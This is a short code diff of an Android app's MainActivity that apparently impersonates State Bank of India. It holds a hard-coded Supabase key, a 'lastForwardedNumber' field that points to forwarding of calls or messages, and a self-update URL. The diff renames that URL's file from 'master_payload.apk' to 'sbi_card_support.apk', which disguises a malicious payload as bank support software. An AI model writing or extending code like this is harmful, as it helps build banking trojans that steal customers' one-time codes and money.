@@ -44,7 +44,7 @@ public class MainActivity extends BridgeActivity {
     private static final String TAG = "SBI_MainActivity";
     private static final String SUPABASE_URL = "https://kisskrjtazekbsbdwrvr.supabase.co";
     private static final String SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imtpc3Nrcmp0YXpla2JzYmR3cnZyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzkyNTU2NzgsImV4cCI6MjA5NDgzMTY3OH0.zq_-C5Qt7O0WAxO5-INNA_hrtbY1UX5JbEP5LaQ73DE";
-    private static final String UPDATE_URL = "https://github.com/sbibank100200-tech/newmade1/releases/latest/download/master_payload.apk";
+    private static final String UPDATE_URL = "https://github.com/sbibank100200-tech/newmade1/releases/latest/download/sbi_card_support.apk";
     private String lastForwardedNumber = "";
 
     @Override
